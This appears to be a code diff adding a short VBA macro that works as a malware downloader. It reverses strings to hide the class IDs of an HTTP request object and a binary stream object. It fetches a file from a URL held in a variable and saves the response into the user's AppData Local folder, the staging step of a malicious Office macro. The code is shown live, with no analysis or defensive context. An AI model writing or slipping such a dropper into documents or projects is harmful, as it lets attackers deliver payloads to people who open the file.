@@ -1,0 +1,20 @@
+Sub Backflip()
+    Set http = GetObject(StrReverse("}594076B97766-BA8A-3594-FEC2-4F2C7802{:wen"))
+    URL = hahaha + "/" + "randomvar"
+    http.Open "GET", URL, False
+    http.setRequestHeader "Content-Type", "application/x-www-form-urlencoded; charset=UTF-8"
+    http.send
+    http.WaitForResponse
+    If http.Status = 200 Then       
+        Dim path_1 As String
+        path_1 = Environ(StrReverse("ATADPPA")) + "\..\Local\" + "randomvar"        
+        Set ObjStream = GetObject(StrReverse("}4AE2D600AA00-0008-0100-0000-66500000{:wen"))
+        ObjStream.Open
+        ObjStream.Type = 1
+        ObjStream.Write http.ResponseBody
+        ObjStream.SaveToFile path_1, 2
+        ObjStream.Close
+    Else
+        Tywin
+    End If    
+End Sub
